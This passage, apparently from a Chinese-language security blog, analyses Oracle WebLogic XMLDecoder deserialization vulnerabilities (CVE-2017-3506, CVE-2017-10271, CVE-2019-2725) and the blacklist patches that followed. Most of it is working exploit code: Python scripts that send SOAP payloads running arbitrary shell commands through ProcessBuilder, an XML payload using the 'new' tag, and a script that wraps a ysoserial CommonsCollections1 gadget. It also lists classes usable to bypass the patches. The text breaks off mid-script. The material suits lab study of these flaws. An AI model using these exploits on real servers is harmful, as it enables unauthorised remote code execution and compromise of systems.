<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">headers = &#123; <span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;text/xml&#x27;</span> &#125;</span><br><span class="line">proxies = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>(<span class="params">url, cmd</span>):</span><br><span class="line">    url = <span class="string">&#x27;%s/wls-wsat/CoordinatorPortType&#x27;</span> % url</span><br><span class="line">    data = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="string">        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;java&gt;</span></span><br><span class="line"><span class="string">            &lt;object class=&quot;java.lang.ProcessBuilder&quot;&gt;</span></span><br><span class="line"><span class="string">              &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;void index=&quot;0&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">                &lt;/void&gt;</span></span><br><span class="line"><span class="string">                &lt;void index=&quot;1&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">                &lt;/void&gt;</span></span><br><span class="line"><span class="string">				&lt;void index=&quot;2&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;string&gt;%s&lt;/string&gt;</span></span><br><span class="line"><span class="string">                &lt;/void&gt;</span></span><br><span class="line"><span class="string">              &lt;/array&gt;</span></span><br><span class="line"><span class="string">              &lt;void method=&quot;start&quot;/&gt;</span></span><br><span class="line"><span class="string">            &lt;/object&gt;</span></span><br><span class="line"><span class="string">          &lt;/java&gt;</span></span><br><span class="line"><span class="string">        &lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="string">      &lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="string">      &lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="string">    &lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> % cmd</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, headers=headers, data=data, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>, proxies=proxies)</span><br><span class="line">        response = response.text</span><br><span class="line">        response = re.search(<span class="string">r&quot;\&lt;faultstring\&gt;.*\&lt;\/faultstring\&gt;&quot;</span>, response).group(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        response = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&lt;faultstring&gt;java.lang.ProcessBuilder&#x27;</span> <span class="keyword">in</span> response <span class="keyword">or</span> <span class="string">&quot;&lt;faultstring&gt;0&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        result = <span class="string">&quot;test ok&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="string">&quot;No Vulnerability&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;python poc.py http://127.0.0.1:7001 touch /tmp/success&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    	ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">    	cmd = <span class="string">&#x27; &#x27;</span>.join(sys.argv[<span class="number">2</span>:])</span><br><span class="line">    	<span class="built_in">print</span>(cmd)</span><br><span class="line">    	<span class="built_in">print</span>(poc(ip, cmd))</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>这个漏洞是构造SOAP（XML）格式的请求触发XMLDecoder的反序列化，把漏洞入口定位在<code>WorkContextServerTube</code>类中的<code>processRequest()</code>方法，<code>var1</code>为我们传入的SOAP请求，它会写到<code>var3</code>中并调用了<code>readHeaderOld()</code>方法</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714384fc665e776134ef9a962.png" alt="image-20210125172658998"></p>
<p>跟进去我们会发现它被传入到了<code>WorkContextXmlInputAdapter</code>类的构造函数中，这个地方就是漏洞的关键，说明我们对任意XML进行反序列化</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714380d533c96064eb3bf975e.png" alt="image-20210125173128468"></p>
<p>跟进这个类，可以发现它直接被带入了<code>XMLDecoder()</code>构造函数</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714392d61ea0a8a3658ce1bb8.png" alt="image-20210125173246975"></p>
<p>跳出来跟进<code>receive()</code>方法，就是处理拿到的XML数据，持续跟进就能看到它调用了<code>readObject()</code>方法进行反序列化</p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271439f774ef60ae7c51d371db.png" alt="image-20210125174531750"></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271439cdce681dad871d89c2e2.png" alt="image-20210125174545079"></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021012714398ed563a56218a3998d96.png" alt="image-20210125174303357"></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271439ab41b28324fe6397a843.png" alt="image-20210125174632414"></p>
<p><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202101271440713e032701c41d85a687.png" alt="image-20210125174415289"></p>
<p><strong>补丁</strong></p>
<p>找了网上别人的补丁主要代码，也是采用黑名单机制</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validate</span><span class="params">(InputStream is)</span> &#123;</span><br><span class="line">    <span class="type">WebLogicSAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebLogicSAXParserFactory</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span> factory.newSAXParser();</span><br><span class="line">        parser.parse(is, <span class="keyword">new</span> <span class="title class_">DefaultHandler</span>() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException &#123;</span><br><span class="line">                <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;object&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> newIllegalStateException(<span class="string">&quot;Invalid context type: object&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(ParserConfigurationException var5) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var5);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(SAXException var6) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var6);</span><br><span class="line">    &#125; <span class="keyword">catch</span>(IOException var7) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var7);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到它只是禁止了<code>qName</code>为<code>object</code>类而已，所以很快就出现了下面CVE-2017-10271的绕过</p>
<h4 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h4><blockquote>
<p>Oracle WebLogic Server 10.3.6.0、12.1.3.0、12.2.1.1、12.2.1.2</p>
</blockquote>
<p><strong>poc</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;text/xml&#x27;</span>&#125;</span><br><span class="line">proxies = &#123;<span class="string">&quot;http&quot;</span>: <span class="string">&quot;http://127.0.0.1:8080&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc</span>(<span class="params">url, cmd</span>):</span><br><span class="line">    url = <span class="string">&#x27;%s/wls-wsat/CoordinatorPortType&#x27;</span> % url</span><br><span class="line">    data = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span></span><br><span class="line"><span class="string">      &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="string">        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span></span><br><span class="line"><span class="string">          &lt;java&gt;</span></span><br><span class="line"><span class="string">            &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span></span><br><span class="line"><span class="string">              &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;void index=&quot;0&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;string&gt;/bin/bash&lt;/string&gt;</span></span><br><span class="line"><span class="string">                &lt;/void&gt;</span></span><br><span class="line"><span class="string">                &lt;void index=&quot;1&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;string&gt;-c&lt;/string&gt;</span></span><br><span class="line"><span class="string">                &lt;/void&gt;</span></span><br><span class="line"><span class="string">				&lt;void index=&quot;2&quot;&gt;</span></span><br><span class="line"><span class="string">                  &lt;string&gt;%s&lt;/string&gt;</span></span><br><span class="line"><span class="string">                &lt;/void&gt;</span></span><br><span class="line"><span class="string">              &lt;/array&gt;</span></span><br><span class="line"><span class="string">              &lt;void method=&quot;start&quot;/&gt;</span></span><br><span class="line"><span class="string">            &lt;/void&gt;</span></span><br><span class="line"><span class="string">          &lt;/java&gt;</span></span><br><span class="line"><span class="string">        &lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="string">      &lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="string">      &lt;soapenv:Body/&gt;</span></span><br><span class="line"><span class="string">    &lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> % cmd</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url, headers=headers, data=data, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        response = response.text</span><br><span class="line">        response = re.search(<span class="string">r&quot;\&lt;faultstring\&gt;.*\&lt;\/faultstring\&gt;&quot;</span>, response).group(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        response = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[*]&#x27;</span>, e)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;&lt;faultstring&gt;java.lang.ProcessBuilder&#x27;</span> <span class="keyword">in</span> response <span class="keyword">or</span> <span class="string">&quot;&lt;faultstring&gt;0&quot;</span> <span class="keyword">in</span> response:</span><br><span class="line">        result = <span class="string">&quot;[+] test ok&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        result = <span class="string">&quot;[*] No Vulnerability&quot;</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;python poc.py http://127.0.0.1:7001 touch /tmp/success&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    	ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">    	cmd = <span class="string">&#x27; &#x27;</span>.join(sys.argv[<span class="number">2</span>:])</span><br><span class="line">    	<span class="built_in">print</span>(<span class="string">&#x27;[*] send payload:&#x27;</span>, cmd)</span><br><span class="line">    	<span class="built_in">print</span>(poc(ip, cmd))</span><br></pre></td></tr></table></figure>

<p>此外还有<code>new</code>标签也可以利用</p>
<blockquote>
<p>注意jdk6不支持<code>new</code>等标签</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;java version=<span class="string">&quot;1.4.0&quot;</span> class=<span class="string">&quot;java.beans.XMLDecoder&quot;</span>&gt;</span><br><span class="line">    &lt;<span class="keyword">new</span> <span class="title class_">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span><br><span class="line">        &lt;string&gt;calc&lt;/string&gt;</span><br><span class="line">        &lt;method name=<span class="string">&quot;start&quot;</span>/&gt;</span><br><span class="line">    &lt;/<span class="keyword">new</span>&gt;</span><br><span class="line">&lt;/java&gt;</span><br></pre></td></tr></table></figure>

<p><strong>漏洞分析</strong></p>
<p>因为和CVE-2017-3506几乎一样，这里就不分析了，其实就是把<code>object</code>标签更改为其他可用的，比如<code>void</code></p>
<p><strong>补丁</strong></p>
<p>对涉及到的<code>object、new、method、void、array</code>类型都进行了检测</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validate</span><span class="params">(InputStream is)</span> &#123;</span><br><span class="line">	<span class="type">WebLogicSAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebLogicSAXParserFactory</span>();</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span> factory.newSAXParser();</span><br><span class="line">		parser.parse(is, <span class="keyword">new</span> <span class="title class_">DefaultHandler</span>()) &#123;</span><br><span class="line">			<span class="keyword">private</span> <span class="type">int</span> <span class="variable">overallarraylength</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXEception &#123;</span><br><span class="line">				<span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;object&quot;</span>)) &#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:object&quot;</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;new&quot;</span>)) &#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:new&quot;</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> <span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;method&quot;</span>)) &#123;</span><br><span class="line">					<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid element qName:method&quot;</span>);</span><br><span class="line">				&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">					<span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;void&quot;</span>)) &#123;</span><br><span class="line">						<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">attClass</span> <span class="operator">=</span> <span class="number">0</span>;attClass &lt; attributes.getLength(); ++attClass) &#123;</span><br><span class="line">							<span class="keyword">if</span> (!<span class="string">&quot;index&quot;</span>.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</span><br><span class="line">								<span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid attribute for element void: &quot;</span> + attributes.getQName(attClass));</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">if</span> (qName.equalsIgnoreCase(<span class="string">&quot;array&quot;</span>)) &#123;</span><br><span class="line">						<span class="type">String</span> <span class="variable">var9</span> <span class="operator">=</span> attributes.getValue(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (var9 != <span class="literal">null</span> &amp;&amp; !var9.equalsIgnoreCase(<span class="string">&quot;byte&quot;</span>)) &#123;</span><br><span class="line">                            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;The value of class attribute is not valid for array element.&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ......</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="CVE-2019-2725"><a href="#CVE-2019-2725" class="headerlink" title="CVE-2019-2725"></a>CVE-2019-2725</h4><blockquote>
<p>Oracle WebLogic Server 10.3.6.0、12.1.3.0</p>
</blockquote>
<p><strong>poc</strong></p>
<blockquote>
<p>这个漏洞在市面上流传的很多payload都是没有考虑CVE-2017-10271的补丁，直接就是新入口+旧payload，比如&lt;void class&#x3D;”xxx”&gt;</p>
<p>真正意义上的对CVE-2017-10271的绕过的关键点在于对&lt;class&gt;标签的利用，即我们可以利用&lt;class&gt;标签来创建任意类的实例</p>
<p>目前能利用的类有</p>
<p>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</p>
<p>com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext</p>
<p>oracle.toplink.internal.sessions.UnitOfWorkChangeSet（version &lt;&#x3D; 10.36，因为超过这个版本就不存在了）</p>
</blockquote>
<p><em>版本 1（ version &lt;&#x3D; 10.36 ）</em></p>
<blockquote>
<p>因为我这里用的是<code>vulhub/weblogic:10.3.6</code>，所以用的是<code>CommonsCollections1</code>的Gadget作为测试，其他情况视具体环境而定</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;text/xml&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_payload</span>(<span class="params">cmd</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        gen_ser = <span class="string">&quot;java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 &#x27;%s&#x27;&quot;</span> % cmd</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] generate CommonsCollections1 payload: %s&quot;</span> % gen_ser)</span><br><span class="line">        poc_ser = subprocess.Popen(gen_ser, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.read()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] generate CommonsCollections1 payload failed&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    xml = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="string">    &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot;&gt;</span></span><br><span class="line"><span class="string">       &lt;soapenv:Header&gt;</span></span><br><span class="line"><span class="string">          &lt;wsa:Action&gt;demoAction&lt;/wsa:Action&gt;</span></span><br><span class="line"><span class="string">          &lt;wsa:RelatesTo&gt;test&lt;/wsa:RelatesTo&gt;</span></span><br><span class="line"><span class="string">          &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span></span><br><span class="line"><span class="string">             &lt;java&gt;</span></span><br><span class="line"><span class="string">                &lt;class&gt;</span></span><br><span class="line"><span class="string">                   &lt;string&gt;oracle.toplink.internal.sessions.UnitOfWorkChangeSet&lt;/string&gt;</span></span><br><span class="line"><span class="string">                   &lt;void&gt;</span></span><br><span class="line"><span class="string">                      &lt;array class=&quot;byte&quot; length=&quot;%d&quot;&gt;</span></span><br><span class="line"><span class="string">                        %s</span></span><br><span class="line"><span class="string">                      &lt;/array&gt;</span></span><br><span class="line"><span class="string">                   &lt;/void&gt;</span></span><br><span class="line"><span class="string">                &lt;/class&gt;</span></span><br><span class="line"><span class="string">             &lt;/java&gt;</span></span><br><span class="line"><span class="string">          &lt;/work:WorkContext&gt;</span></span><br><span class="line"><span class="string">       &lt;/soapenv:Header&gt;</span></span><br><span class="line"><span class="string">       &lt;soapenv:Body&gt;</span></span><br><span class="line"><span class="string">          &lt;asy:onAsyncDelivery /&gt;</span></span><br><span class="line"><span class="string">       &lt;/soapenv:Body&gt;</span></span><br><span class="line"><span class="string">    &lt;/soapenv:Envelope&gt;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    exploit = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    _index = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> poc_ser:</span><br><span class="line">        _byte = <span class="built_in">int</span>.from_bytes(struct.pack(<span class="string">&quot;B&quot;</span>, i), byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">True</span>)</span><br><span class="line">        exploit += <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            &lt;void index=&quot;%d&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;byte&gt;%d&lt;/byte&gt;</span></span><br><span class="line"><span class="string">            &lt;/void&gt;</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span> % (_index, _byte)</span><br><span class="line">        _index += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    payload = xml % 